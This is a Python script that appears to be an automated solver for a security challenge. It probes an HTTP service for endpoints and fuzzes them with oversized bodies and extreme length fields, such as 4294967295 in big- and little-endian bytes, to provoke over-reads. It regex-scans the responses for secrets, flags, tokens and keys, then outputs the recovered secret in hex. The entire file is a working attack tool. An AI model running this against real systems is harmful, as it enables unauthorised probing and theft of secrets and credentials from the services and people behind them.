import sys, json, base64, re, binascii
LOG = []
def send(req, tag):
    sys.stdout.write(json.dumps({'http': req}) + '\n')
    sys.stdout.flush()
    line = sys.stdin.readline()
    r = None
    if line:
        try:
            r = json.loads(line)
        except Exception:
            r = {}
    st = None
    b = ''
    if isinstance(r, dict):
        st = r.get('status')
        bb = r.get('body_b64')
        if bb:
            try:
                b = base64.b64decode(bb).decode('utf-8', 'replace')
            except Exception:
                b = ''
    LOG.append({'tag': tag, 'path': req.get('path'), 'status': st, 'body': b[:1500]})
    return st, b
def go(req, tag):
    if len(LOG) >= 700:
        return None, ''
    return send(req, tag)
base = ['/', '/help', '/index.html', '/api', '/parse', '/record', '/records', '/read', '/upload', '/ingest', '/data', '/echo', '/decode', '/health', '/status', '/info', '/docs', '/api/parse', '/v1/parse', '/read_record', '/secret', '/debug', '/robots.txt', '/version', '/openapi.json']
for p in base:
    go({'method': 'GET', 'path': p}, 'G ' + p)
disc = []
for rec in LOG:
    for m in re.findall(r'/[A-Za-z0-9_.~-]{2,32}', rec['body'] or ''):
        if m not in disc and m not in base:
            disc.append(m)
disc = disc[:25]
for p in disc:
    go({'method': 'GET', 'path': p}, 'D ' + p)
def score(rec):
    s = rec['status'] or 0
    n = len((rec['body'] or '').strip())
    v = 0
    if s == 200:
        v += 3
    if s and s != 404:
        v += 2
    v += min(n, 400) // 100
    return v
ranked = sorted(LOG, key=score, reverse=True)
targets = []
for r in ranked:
    if r['path'] and r['path'] not in targets:
        targets.append(r['path'])
targets = targets[:2] or ['/parse']
texts = ['', 'A', 'A' * 300, 'A' * 5000, '{"length": 4294967295}', '{"len": 4294967295}', '{"size": -1}', '{"data": "AAAA"}']
for p in targets:
    for t in texts:
        go({'method': 'POST', 'path': p, 'body': t}, 'T ' + p)
lengths = [0, 1, 4, 8, 15, 16, 31, 32, 63, 64, 127, 128, 255, 256, 1024, 4095, 4096, 65535, 65536, 2147483647, 2147483648, 4294967294, 4294967295]
for p in targets:
    for w in (2, 4):
        for e in ('big', 'little'):
            for L in lengths:
                body = L.to_bytes(w, e, signed=False)
                go({'method': 'POST', 'path': p, 'body_hex': body.hex()}, 'L %s %d %s %d' % (p, w, e, L))
qs = ['len', 'length', 'size', 'n', 'count', 'bytes', 'sz', 'read']
vals = ['0', '-1', '4294967295', '65535', '2147483648', '1000000000']
for p in targets:
    for q in qs:
        for v in vals:
            go({'method': 'GET', 'path': p + '?' + q + '=' + v}, 'Q ' + p)
for p in targets[:2]:
    go({'method': 'GET', 'path': p + '/' + 'A' * 3000}, 'P ' + p)
    go({'method': 'POST', 'path': p, 'body_hex': (b'A' * 8).hex()}, 'A ' + p)
def hexof(x):
    return binascii.hexlify(x.encode('utf-8', 'replace')).decode()
secret = None
pats = [re.compile(r'secret[^0-9A-Fa-f]{0,24}([0-9A-Fa-f]{16,})'), re.compile(r'(?:flag|ctf|acts|token|key)[-_]?[a-z]*[:= ]+([0-9A-Fa-f]{16,})', re.I), re.compile(r'\b([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})\b'), re.compile(r'\b([0-9A-Fa-f]{32,})\b')]
for rec in LOG:
    body = rec['body'] or ''
    for pat in pats:
        for m in pat.finditer(body):
            c = m.group(1).replace('-', '')
            if len(c) >= 16 and len(c) % 2 == 0:
                secret = c.lower()
                break
        if secret:
            break
    if secret:
        break
if not secret:
    for rec in LOG:
        m = re.search(r'\{([0-9A-Za-z_-]{12,})\}', rec['body'] or '')
        if m:
            secret = hexof(m.group(1))
            break
try:
    f = open('/tmp/acts_findings.json', 'w')
    f.write(json.dumps(LOG)[:300000])
    f.close()
except Exception:
    pass
sys.stdout.write('CLAIM:' + json.dumps({'secret_hex': secret or ''}) + '\n')
sys.stdout.flush()